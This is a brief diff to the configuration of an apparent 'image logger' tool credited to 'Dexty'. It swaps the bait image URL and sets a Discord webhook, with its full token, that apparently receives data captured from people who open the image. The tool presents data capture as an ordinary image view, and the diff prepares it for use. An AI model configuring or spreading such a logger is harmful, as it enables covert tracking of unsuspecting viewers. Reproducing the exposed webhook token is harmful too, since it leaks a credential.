@@ -14,7 +14,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1389698012984377395/m3qRwvrwfcq6T84aH4yK3RS9CyaFrAqVbNbTnaoWJcBOv1f_RJ124FSwxAMICAmQt9AP",
-    "image": "https://cdn.allfamous.org/people/avatars/flamefrags-886o-allfamous.org.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://dunb17ur4ymx4.cloudfront.net/packages/images/49682ff8c25dd840985c91b3f67ebf2ae5e14d0b.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
